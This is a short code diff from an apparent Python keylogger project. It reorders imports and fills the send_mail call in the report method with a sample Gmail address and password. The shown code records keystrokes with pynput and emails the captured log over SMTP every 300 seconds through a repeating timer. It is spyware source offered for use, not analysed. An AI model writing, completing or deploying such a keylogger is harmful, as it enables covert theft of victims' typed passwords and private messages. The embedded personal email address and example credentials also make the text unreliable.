@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
-import threading
 import pynput.keyboard
+import threading
 import smtplib
 
 
@@ -42,7 +42,7 @@ class Keylogger:
                 self.log = self.log + " " + str(key) + " "
 
     def report(self):
-        self.send_mail("Your email id ", "Your Password", self.log)
+        self.send_mail("Your email id Ex: arnavkumar6360@gmail.com", "Your Password Ex: abc123def456", self.log)
         self.log = "\n\n"
         timer = threading.Timer(300, self.report)
         timer.start()
